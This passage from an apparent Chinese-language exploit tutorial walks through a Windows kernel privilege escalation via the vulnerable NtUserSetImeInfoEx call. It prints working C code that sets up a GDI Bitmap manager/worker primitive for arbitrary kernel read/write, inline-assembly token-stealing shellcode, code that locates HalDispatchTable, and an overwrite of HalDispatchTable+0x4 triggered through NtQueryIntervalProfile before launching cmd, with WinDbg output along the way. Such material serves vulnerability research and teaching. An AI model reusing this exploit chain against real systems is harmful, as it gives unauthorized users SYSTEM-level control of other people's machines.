    // Bitmap句柄的末尾四字节为GDICELL在GdiShareHandleTable中的索引，通过LOWROD来取
    DWORD p = (gtable + LOWORD(h) * sizeof(GDICELL)) & 0x00000000ffffffff;
    GDICELL* c = (GDICELL*)p;
    return (char*)c->pKernelAddress + 0x30;
    }
    //得到偏移量
    PVOID managerpv= getpvscan0(gManger);
    PVOID workpv = getpvscan0(gWorker);
    //使tagwindowstation->spklList->hkl（内存偏移为0x00000014） = workpvscan0偏移量
    *(DWORD*)(0x14) = (DWORD)(workpv);
    //使tagwindowstation->spklList->piiex（内存偏移为0x0000002c）= managerpvscan0偏移量
    *(DWORD*)(0x2C) = (DWORD)(managerpv);
    // 由于拷贝384字节，设置buf为大于384字节即可，并将buf每个字节设置0，避免读取空
    //为跳过While循环，我们令DWORD Buf[0] = workpvscan0偏移量，由于类型为DWORD，因此每次读取4字节。
    char buf[0x200];
    RtlSecureZeroMemory(&buf, 0x200);
    PVOID *p = (PVOID*)&buf;
    p[0] = (PVOID)wo
由于我们直接覆盖pvscan0后的数据，因此要对pvscan0后的其余成员变量进行填充修复，避免影响Get\SetBitmaps函数的使用，正常情况下，成员变量的值为下图中红框处，我们填充进buf当中。
p[0] 为WorkBitmap的pvscan0偏移，图中为83f7f3fc
    p[1] = 0x180;
    p[2] = 0x2110;
    p[3] = 6;
    p[4] = 0x10000;
    // p[5] = 0x00000000，因为先前buf已经分配0，因此不用赋值
    p[6] = 0x4800200;
    //调用存在漏洞的NtUserSetImeInfoEx
    HWINSTA hStation = CreateWindowStation(0, 0, READ_CONTROL, 0);
    SetProcessWindowStation(hStation);
    NtUserSetImeInfoEx((PVOID)&buf)
此时，再进行调试，就可以发现，ManagerPvscan0已经指向了“WorkPvscan0的偏移量”了，Windbg调试命令如下：
    kd> !process 0 0 project3.exe
    PROCESS 866c0858 SessionId: 1 Cid: 0eb0   Peb: 7ffdc000 ParentCid: 0c08
        DirBase: 3f3373c0 ObjectTable: 88257c78 HandleCount: 19.
    Image: Project3.exe
    kd> .process /r /p 866c0858
    dt _peb @$peb
    +0x094 GdiSharedHandleTable : 0x00480000 Void
    kd> dd 0x00480000 + (0x89050cd3 & 0xffff) * 0x10
    0048cd30 fe674608 00000eb0 40058905 00000000
    kd> dd fe674608 + 0x30
    fe674638 fdfe0ad0 00000180 00002111 00000
至此，通过对ManagerBitmap句柄做SetBitmaps操作，即可更改WorkPvscan0指针的值，可指向内核任意地址。
**（三）替换系统函数执行ShellCode实现提权原理**
这里的ShellCode采用替换进程的令牌Toekn的方法，将当前用户态进程的令牌Token替换为高权限进程的Token，进而实现权限提升。
    __declspec(naked) VOID ShellCode()
    {
    _asm
    {
    pushad
    mov eax, fs: [124h] // Find the _KTHREAD structure of the current thread
    mov eax, [eax + 0x50] // find the _EPROCESS structure
    mov ecx, eax
    mov edx, 4 // edx = system PID(4)
    // The loop is to get the _EPROCESS of system
    find_sys_pid :
    mov eax, [eax + 0xb8] // Find the linked list of process activities
    sub eax, 0xb8  // Linked list traversal
    cmp[eax + 0xb4], edx  // Determine whether it is SYSTEM according to PID
    jnz find_sys_pid
    // Replace Token
    mov edx, [eax + 0xf8]
    mov[ecx + 0xf8], edx
    popad
    xor eax, eax
    ret
    }
    }
单纯在用户态定义shellcode函数并进行调用，是无法获取高权限的进程令牌Token的，因此需要在内核态中，对shellcode函数进行调用，方可实现令牌Token替换的目的。
由于，我们具备了在内核态中的读写能力，我们可以找到在用户态中可以调用的,并且会产生模式切换的系统API函数，通过内核写，将该函数的入口地址修改为shellcode函数的入口地址，当我们在用户态调用该函数时，会进行模式切换，切换为内核模式并以内核权限调用我们的shellcode函数，进而实现提权。
我们可以在SSDT（SystemService Dispatch Table）、HalDispatchTable
两个表中去寻找可调用的内核API函数。在选用内核 API
函数的时候，要尽可能选择较少调用的函数，避免在修改了函数地址同时时，有其他进程进行调用，导致内存访问出错或程序崩溃。参考链接：[
_https://blog.csdn.net/qq_43312649/article/details/105295017_](https://blog.csdn.net/qq_43312649/article/details/105295017)
这里选用的内核API函数为NtQueryIntervalProfile，NtQueryIntervalProfile函数是在ntdll.dll中导出的未公开的系统调用，可以直接在用户态下进行调用，因此我们可以通过Bitmap
GDI技术，对该函数的入口地址进行替换与恢复。NtQueryIntervalProfile()是Ntdll.dll中导出的未公开的系统调用，它会调用由内核可执行程序ntosknl.exe导出的KeQueryIntervalProfile函数。
而KeQueryIntervalProfile函数又会进一步调用HalDispatchTable表加0x4偏移量的函数地址
因此，我们可以将ShellCode的入口地址，通过内核写漏洞，写入到HalDispatchTable +
0x4中，当我们调用NtQueryIntervalProfile并产生模式切换的时候，就会在内核态中调用我们的ShellCode函数，进而完成提权。
**（四）寻找HalDispatchTable地址**
对于Windows系统的内核态而言，可划分为以下：
（1）硬件抽象层（HardwareAbstraction Layer -> Hal)
（2）内核（Kernel）
（3）运行体（Executive）
（4）窗体图形子系统（WindowsGraphicsSubsystem）
而HalDispatch正是与硬件抽象层有关，因此我们需从系统加载的内核程序中进行导出，此处以加载内核程序ntkrnlpa.exe为例，通过EnumDeviceDrivers函数，获取在内核空间中ntkrnlpa.exe运行时的基址，。
    #include
    LPVOID NtkrnlpaBase()
    {
        LPVOID lpImageBase[1024];
        DWORD lpcbNeeded;
       CHAR lpfileName[1024];
        //Retrieves the load address for each device driver in the system
        EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
        for (int i = 0; i < 1024; i++)
        {
            //Retrieves the base name of the specified device driver
            GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, 48);
            if (!strcmp(lpfileName, "ntkrnlpa.exe"))
            {
                printf("[+]success to get %s\n", lpfileName);
                return lpImageBase[i];
            }
        }
        return NULL;
    }
然后在用户态，加载ntkrnlpa.exe程序，并搜索HalDispatchTable表的导出地址，并用用户态中的HalDispatchTable导出地址减去用户态中加载ntkrnlpa.exe的模块基址，就可以获得HalDispatchTable表相对于模块基址的偏移量，最后由内核空间中ntkrnlpa.exe基址加上偏移量，得到HalDispatchTable在内核中的地址，并加上0x4偏移量进行返回。
    DWORD32 GetHalOffset_4()
    {
        // 获取ntkrnlpa.exe运行时基址
        PVOID pNtkrnlpaBase = NtkrnlpaBase();
        printf("[+]ntkrnlpa base address is 0x%p\n", pNtkrnlpaBase);
        // 获取用户态加载ntkrnlpa.exe的地址
        HMODULE hUserSpaceBase = LoadLibrary("ntkrnlpa.exe");
        // 获取用户态中HalDispatchTable的地址
        PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, "HalDispatchTable");
        // 由ntkrnlpa.exe运行时基址加上HalDispatchTable偏移量，得到HalDispatchTable在内核空间中的地址，加上0x4偏移量
        DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + 0x4;
        printf("[+]HalDispatchTable+0x4 is 0x%p\n", hal_4);
        return (DWORD32)hal_4;
    }
**（五）触发ShellCode**
    // 定义函数原型
    typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
        IN ULONG ProfileSource,
        OUT PULONG Interval
    );
    PVOID pOrg = 0;
        DWORD haladdr = GetHalOffset_4();
        PVOID oaddr = (PVOID)haladdr;
        PVOID sc = &ShellCode;
    //替换NtQueryIntervalProfile的地址为shellcode的地址
    SetBitmapBits((HBITMAP)gManger, sizeof(PVOID), &oaddr); //Use manager to set the modifiable address of worker as hal function
        printf("[+]The target address to be overwritten 0x%x\n", oaddr);
        GetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &pOrg);//Get the address that can be modified
        SetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &sc);//Set the address to shellcode
        printf("[+] Overwriting is complete, ready to execute Shellcode");
        // 调用NtQueryIntervalProfile，触发shellcode函数
        NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibrary("ntdll.dll"), "NtQueryIntervalProfile");
        printf("[+]NtQueryIntervalProfile address is 0x%x\n", NtQueryIntervalProfile);
        DWORD interVal = 0;
        NtQueryIntervalProfile(0x1337, &interVal);
        //恢复NtQueryIntervalProfile函数地址
    SetBitmapBits((HBITMAP)gWorker, sizeof(PVOID), &pOrg);
    system("cmd");
## 三、踩坑
（一）编译时，留意Visual
Studio的MFC以及字符集设置，如果采用静态，则调用函数时，要留意末端是W（Unicode字符集）还是A（多字节字符集），所选用的函数必须与字符集相匹配，否则会出现正常编译运行，但没有效果的问题。
（二）计算偏移时，要留意内存对齐问题
## 四、参考链接
（一）[
_https://www.freebuf.com/vuls/180227.html_](https://www.freebuf.com/vuls/180227.html)
（二）[ _https://docs.microsoft.com/en-us/previous-versions/bb665982(v=msdn.10)_](https://docs.microsoft.com/en-us/previous-versions/bb665982\(v=msdn.10\))
（三）[
_http://t.zoukankan.com/exclm-p-4107662.html_](http://t.zoukankan.com/exclm-p-4107662.html)
（四）[ _https://www.coresecurity.com/sites/default/files/private-files/publications/2016/10/Abusing%20GDI%20for%20ring0%20exploit%20primitives-2015.pdf_](https://www.coresecurity.com/sites/default/files/private-files/publications/2016/10/Abusing%20GDI%20for%20ring0%20exploit%20primitives-2015.pdf)
（五）https://www.programmersought.com/article/84165899589/